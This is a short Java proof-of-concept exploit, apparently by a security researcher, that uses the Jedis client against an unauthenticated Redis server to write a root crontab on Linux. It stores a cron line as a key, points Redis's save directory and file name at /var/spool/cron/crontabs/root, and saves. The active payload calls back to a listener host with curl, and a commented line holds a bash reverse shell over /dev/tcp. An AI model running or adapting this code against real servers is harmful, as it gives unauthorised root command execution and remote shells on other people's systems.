package cn.b1ue.redis.filewrite.linux;

import redis.clients.jedis.Jedis;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2020/4/2 22:57
 */
public class Crontab {

    public static void main(String[] args) {


        Jedis jedis = new Jedis("192.168.91.147", 6379);
        //jedis.flushAll();  //此方法会删除redis的所有数据，不要在生产环境调用此方法
        //jedis.set("x", "\n\n* * * * * /bin/bash -i >& /dev/tcp/192.168.91.1/9999 0>&1\n\n");
        jedis.set("x", "\n\n* * * * * curl 192.168.91.1:9999\n\n");
        jedis.configSet("dir","/var/spool/cron/crontabs/");
        jedis.configSet("dbfilename","root");
        jedis.save();

        jedis.close();


    }

}
